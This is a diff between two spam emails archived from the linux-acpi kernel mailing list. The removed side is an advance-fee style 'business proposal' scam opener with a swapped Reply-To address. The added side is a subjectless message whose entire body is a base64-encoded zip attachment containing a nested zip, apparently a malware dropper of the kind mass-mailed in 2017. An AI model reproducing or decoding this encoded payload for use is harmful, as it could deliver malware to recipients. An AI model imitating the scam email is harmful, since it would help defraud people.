@@ -1,25 +1,54 @@
-From: QUATIF GROUP OF COMPANIES <voluntariado@uct.cl>
-Subject: Business Proposal
-Date: Sun, 16 Apr 2017 05:08:38 -0300 (CLST)
-Message-ID: <656237451.45007772.1492330118117.JavaMail.zimbra@uct.cl>
-Reply-To: QUATIF GROUP OF COMPANIES <adriensaif200@gmail.com>
+From: <geir.nuland@lyse.net>
+Subject: (unknown)
+Date: Sun, 16 Apr 2017 08:52:09 -0000
+Message-ID: <149233272920.20711.1594913100068746653@smartlation.info>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 7bit
+Content-Type: application/zip; name="EMAIL_75980237014631_linux-acpi.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-acpi-owner@vger.kernel.org>
-Received: from newrehue.uct.cl ([164.77.114.3]:60342 "EHLO newrehue.uct.cl"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1752638AbdDPIsb (ORCPT <rfc822;linux-acpi@vger.kernel.org>);
-        Sun, 16 Apr 2017 04:48:31 -0400
+Received: from mail.smartlation.info ([76.72.161.186]:45580 "HELO
+        smartlation.info" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+        with SMTP id S1752442AbdDPIwM (ORCPT
+        <rfc822;linux-acpi@vger.kernel.org>); Sun, 16 Apr 2017 04:52:12 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: linux-acpi-owner@vger.kernel.org
 List-Id: linux-acpi@vger.kernel.org
+To: linux-acpi <linux-acpi@vger.kernel.org>
 
-
-
-Dear Friend,
- 
-I would like to discuss a very important issue with you. I am writing to find out if this is your valid email. Please, let me know if this email is valid
- 
-Kind regards
-Adrien Saif
-Attorney to Quatif Group of Companies
+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
